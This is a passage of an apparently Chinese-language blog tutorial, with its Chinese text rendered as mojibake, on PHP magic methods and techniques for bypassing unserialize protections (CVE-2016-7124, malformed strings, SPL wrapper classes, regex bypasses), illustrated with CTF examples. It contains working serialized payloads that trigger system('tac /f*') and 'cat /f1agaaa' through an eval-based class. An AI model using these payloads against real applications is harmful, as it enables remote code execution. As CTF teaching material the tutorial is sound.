<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ä¸å­˜åœ¨&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;æ–¹æ³•(__call)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>	&#125;<br><br>		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callstatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ä¸å­˜åœ¨&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;æ–¹æ³•(__callstatic)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">lewiserii</span>();<br>test::<span class="hljs-title function_ invoke__">lewiserii</span>();<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">ä¸å­˜åœ¨lewiseriiæ–¹æ³•(__call)<br>ä¸å­˜åœ¨lewiseriiæ–¹æ³•(__callstatic)<br></code></pre></td></tr></table></figure>

<h2 id="get-amp-set"><a href="#get-amp-set" class="headerlink" title="__get &amp; __set"></a>__get &amp; __set</h2><p><code>__get</code>ï¼šå¯¹ä¸å¯è®¿é—®å±æ€§æˆ–ä¸å­˜åœ¨å±æ€§è¿›è¡Œ è®¿é—®å¼•ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨<br><code>__set</code>ï¼šå¯¹ä¸å¯è®¿é—®å±æ€§æˆ–ä¸å­˜åœ¨å±æ€§è¿›è¡Œ å†™å…¥æ—¶è‡ªåŠ¨è°ƒç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get\n&quot;</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set\n&quot;</span>;<br>	&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;password;<br><span class="hljs-variable">$a</span>-&gt;password=<span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__get<br>__set<br></code></pre></td></tr></table></figure>



<h2 id="isset-amp-unset"><a href="#isset-amp-unset" class="headerlink" title="__isset &amp; __unset"></a>__isset &amp; __unset</h2><p><code>__isset</code>ï¼šåœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨<code>inset()</code>æ—¶è§¦å‘<br><code>__unset</code>ï¼šåœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨<code>unset()</code>æ—¶è§¦å‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__isset\n&quot;</span>;<br>	&#125;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__unset\n&quot;</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>-&gt;password);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>-&gt;psd);<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__isset<br>__unset<br></code></pre></td></tr></table></figure>

<h2 id="tostring"><a href="#tostring" class="headerlink" title="__tostring"></a>__tostring</h2><p><code>__toString()</code>ï¼šç±»çš„å®ä¾‹å’Œå­—ç¬¦ä¸²æ‹¼æ¥æˆ–è€…ä½œä¸ºå­—ç¬¦ä¸²å¼•ç”¨æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;tostring&quot;</span>;<br>	&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">tostring<br></code></pre></td></tr></table></figure>



<h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p><code>__invoke()</code>ï¼šå°†å¯¹è±¡å½“ä½œå‡½æ•°æ¥ä½¿ç”¨æ—¶è°ƒç”¨æ­¤æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke&quot;</span>;<br>	&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">__invoke<br></code></pre></td></tr></table></figure>


<h1 id="ååºåˆ—åŒ–ç»•è¿‡çš„å‡ ç§æ–¹æ³•"><a href="#ååºåˆ—åŒ–ç»•è¿‡çš„å‡ ç§æ–¹æ³•" class="headerlink" title="ååºåˆ—åŒ–ç»•è¿‡çš„å‡ ç§æ–¹æ³•"></a>ååºåˆ—åŒ–ç»•è¿‡çš„å‡ ç§æ–¹æ³•</h1><h2 id="ç»•è¿‡-wakeup"><a href="#ç»•è¿‡-wakeup" class="headerlink" title="ç»•è¿‡__wakeup"></a>ç»•è¿‡__wakeup</h2><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><blockquote>
<p>åˆ©ç”¨æ¡ä»¶ï¼š<br>PHP5 &lt; 5.6.25<br>â€‹PHP7 &lt; 7.0.10</p>
</blockquote>
<p>åˆ©ç”¨æ–¹å¼ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡<code>__wakeup</code>çš„æ‰§è¡Œ</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//$v = new test();</span><br><span class="hljs-comment">//echo serialize($v);</span><br><span class="hljs-comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å½“æ‰§è¡Œ<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>æ—¶ä¼šè¿”å›<code>aaa</code>ï¼Œåœ¨ä¿®æ”¹å¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼ï¼Œæ‰§è¡Œ<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:4:&quot;test&quot;;&#125;&#39;);</code>ä¼šè¿”å›<code>test</code></p>
<h3 id="åˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æŠ¥é”™"><a href="#åˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æŠ¥é”™" class="headerlink" title="åˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æŠ¥é”™"></a>åˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æŠ¥é”™</h3><p>åˆ©ç”¨ä¸€ä¸ªåŒ…å«<code>__destruct</code>æ–¹æ³•çš„ç±»è§¦å‘é­”æœ¯æ–¹æ³•å¯ç»•è¿‡<code>__wakeup</code>æ–¹æ³•</p>
<p>ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__get(<span class="hljs-subst">$name</span>)\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__destruct\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;D::__wakeup\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C::__destruct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;;N;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>åŸæœ¬åº”è¯¥æ˜¯<code>O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;D&quot;:0:&#123;&#125;&#125;</code><br>è°ƒç”¨é¡ºåºæ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">D::<span class="hljs-variable constant_">__wakeup</span><br>C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure>

<p>æ·»åŠ äº†ä¸€ä¸ª<code>;N;</code>(ååºåˆ—åŒ–æœ«å°¾åŠ ä¸Š<code>;ä»»æ„å­—ç¬¦;</code>)çš„é”™è¯¯ç»“æ„åè°ƒç”¨é¡ºåºå°±å˜æˆäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">C::<span class="hljs-variable constant_">__destruct</span><br>D::<span class="hljs-title function_ invoke__">__get</span>(b)<br>D::<span class="hljs-variable constant_">__wakeup</span><br>D::<span class="hljs-variable constant_">__destruct</span><br></code></pre></td></tr></table></figure>

<p>æ¥è‡ªArticle_kelpå¸ˆå‚…çš„åŸç†è§£é‡Šï¼Œorzï¼š<br><img src="/img/summary/php_unserialize-16.jpg"></p>
<h3 id="ä½¿ç”¨Cä»£æ›¿O"><a href="#ä½¿ç”¨Cä»£æ›¿O" class="headerlink" title="ä½¿ç”¨Cä»£æ›¿O"></a>ä½¿ç”¨Cä»£æ›¿O</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">a - <span class="hljs-keyword">array</span><br>b - <span class="hljs-keyword">boolean</span><br>d - <span class="hljs-keyword">double</span><br>i - <span class="hljs-keyword">integer</span><br>o - common <span class="hljs-keyword">object</span><br>r - reference<br>s - <span class="hljs-keyword">string</span><br>C - custom <span class="hljs-keyword">object</span><br>O - <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"><span class="hljs-title">N</span> - <span class="hljs-title">null</span></span><br><span class="hljs-class"><span class="hljs-title">R</span> - <span class="hljs-title">pointer</span> <span class="hljs-title">reference</span></span><br><span class="hljs-class"><span class="hljs-title">U</span> - <span class="hljs-title">unicode</span> <span class="hljs-title">string</span></span><br></code></pre></td></tr></table></figure>

<p>ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YAje0</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=81151</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span>  </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;destruct&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wake up&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;C:1:&quot;E&quot;:0:&#123;&#125;&#x27;</span>));<br></code></pre></td></tr></table></figure>

<p>æ¯”è¾ƒé¸¡è‚‹ï¼Œåªèƒ½æ‰§è¡Œ<code>construct()</code>å’Œ<code>destruct()</code>å‡½æ•°ï¼Œæ— æ³•æ·»åŠ ä»»ä½•å†…å®¹</p>
<p>ä½†æ˜¯åœ¨<strong>ç‰¹å®šçš„PHPç‰ˆæœ¬</strong>ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›å†…ç½®ç±»æ¥é‡æ–°åŒ…è£…å®ç°ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">ArrayObject</span>::<span class="hljs-variable constant_">unserialize</span><br><span class="hljs-title class_">ArrayIterator</span>::<span class="hljs-variable constant_">unserialize</span><br><span class="hljs-title class_">RecursiveArrayIterator</span>::<span class="hljs-variable constant_">unserialize</span><br><span class="hljs-title class_">SplDoublyLinkedList</span>::<span class="hljs-variable constant_">unserialize</span><br><span class="hljs-title class_">SplQueue</span>::<span class="hljs-variable constant_">unserialize</span><br><span class="hljs-title class_">SplStack</span>::<span class="hljs-variable constant_">unserialize</span><br><span class="hljs-title class_">SplObjectStorage</span>::<span class="hljs-variable constant_">unserialize</span><br></code></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ctfshowçš„2023æ„šäººæ¯[easy_php]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ctfshow</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OK&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;ctfshow);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$a</span>-&gt;ctfshow= <span class="hljs-string">&quot;cat /f1agaaa&quot;</span>;<br><br><br><br><span class="hljs-comment">//$b=new SplObjectStorage();</span><br><span class="hljs-comment">//$b-&gt;test=$a;</span><br><span class="hljs-comment">//echo serialize($b);</span><br><span class="hljs-comment">//C:16:&quot;SplObjectStorage&quot;:77:&#123;x:i:0;m:a:1:&#123;s:4:&quot;test&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;&#125;&#125;</span><br><br><br><br><span class="hljs-comment">//$b=new ArrayObject($a);</span><br><span class="hljs-comment">//echo serialize($b);</span><br><span class="hljs-comment">//C:11:&quot;ArrayObject&quot;:67:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span><br><br><br><br><span class="hljs-comment">//$b=new ArrayIterator($a);</span><br><span class="hljs-comment">//echo serialize($b);</span><br><span class="hljs-comment">//C:13:&quot;ArrayIterator&quot;:67:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span><br><br><br><br><br><span class="hljs-comment">//$b=new RecursiveArrayIterator($a);</span><br><span class="hljs-comment">//echo serialize($b);</span><br><span class="hljs-comment">//C:22:&quot;RecursiveArrayIterator&quot;:67:&#123;x:i:0;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;;m:a:0:&#123;&#125;&#125;</span><br><br><br><br><span class="hljs-comment">//$b=new SplDoublyLinkedList();</span><br><span class="hljs-comment">//$b-&gt;push($a);</span><br><span class="hljs-comment">//echo serialize($b);</span><br><span class="hljs-comment">//C:19:&quot;SplDoublyLinkedList&quot;:57:&#123;i:0;:O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;&#125;</span><br><br><br><br><br><span class="hljs-comment">//$b=new SplQueue();</span><br><span class="hljs-comment">//$b-&gt;push($a);</span><br><span class="hljs-comment">//echo serialize($b);</span><br><span class="hljs-comment">//C:8:&quot;SplQueue&quot;:57:&#123;i:4;:O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;&#125;</span><br><br><br><br><span class="hljs-comment">//$b=new SplStack();</span><br><span class="hljs-comment">//$b-&gt;push($a);</span><br><span class="hljs-comment">//echo serialize($b);</span><br><span class="hljs-comment">//C:8:&quot;SplStack&quot;:57:&#123;i:6;:O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:12:&quot;cat /f1agaaa&quot;;&#125;&#125;</span><br><br></code></pre></td></tr></table></figure>


<p>ä¸è¿‡æœ‰å‡ ä¸ªç±»åœ¨ä½¿ç”¨æ—¶è¦æ³¨æ„éœ€è¦åŠ å…¥pushæ–¹æ³•</p>
<h2 id="ç»•è¿‡æ­£åˆ™"><a href="#ç»•è¿‡æ­£åˆ™" class="headerlink" title="ç»•è¿‡æ­£åˆ™"></a>ç»•è¿‡æ­£åˆ™</h2><h3 id="æ£€æµ‹â€™Oâ€™"><a href="#æ£€æµ‹â€™Oâ€™" class="headerlink" title="æ£€æµ‹â€™Oâ€™"></a>æ£€æµ‹â€™Oâ€™</h3><blockquote>
<p>åˆ©ç”¨æ¡ä»¶ï¼š<br>preg_match(â€˜&#x2F;^O:\d+&#x2F;iâ€™,$data)</p>
</blockquote>
<p>ä¾‹é¢˜ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/i&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;object not allow unserialize&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>


<p>åˆ©ç”¨æ–¹å¼1ï¼šå½“åœ¨ä»£ç ä¸­ä½¿ç”¨ç±»ä¼¼<code>preg_match(&#39;/^O:\d+/i&#39;,$data)</code>çš„æ­£åˆ™è¯­å¥æ¥åŒ¹é…æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<code>+</code>ç»•è¿‡</p>
<p><code>O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code><br><code>O:+8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#39;tac /f*&#39;);&quot;;&#125;</code></p>
<p>è¦æ³¨æ„åœ¨<code>url</code>é‡Œä¼ å‚æ—¶<code>+</code>è¦ç¼–ç ä¸º<code>%2B</code></p>
<p>åˆ©ç”¨æ–¹å¼2ï¼šä½¿ç”¨<code>array()</code>ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">backdoor</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-comment">//a:1:&#123;i:0;O:8:&quot;backdoor&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="æ£€æµ‹â€™-â€™"><a href="#æ£€æµ‹â€™-â€™" class="headerlink" title="æ£€æµ‹â€™}â€™"></a>æ£€æµ‹â€™}â€™</h3><p>æœ‰æ—¶å€™ä¼šé‡åˆ°å¦ä¸€ç§æ­£åˆ™ï¼Œæ¯”å¦‚<code>/\&#125;$/</code>ï¼Œä¼šåŒ¹é…æœ€åä¸€ä¸ª<code>&#125;</code></p>
<p>ååºåˆ—åŒ–å­—ç¬¦ä¸²æœ«å°¾çš„<code>&#125;&#125;&#125;&#125;</code>æ˜¯å¯ä»¥å…¨éƒ¨åˆ æ‰çš„ï¼Œæ²¡æœ‰å½±å“</p>
<p>æ¯”å¦‚<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#125;</code></p>
<p>å˜æˆ<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;</code></p>
<p>ç”šè‡³åœ¨æœ«å°¾å¡«å……å­—ç¬¦<code>a:1:&#123;i:0;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;aaaaaaaaaa</code></p>
<p>å‡èƒ½æ­£å¸¸è§£æ</p>
<h3 id="æ£€æµ‹æ•°å­—"><a href="#æ£€æµ‹æ•°å­—" class="headerlink" title="æ£€æµ‹æ•°å­—"></a>æ£€æµ‹æ•°å­—</h3><p>å¯ä»¥ç”¨å­—ç¬¦<code>i</code>ã€<code>d</code>ç»•è¿‡</p>
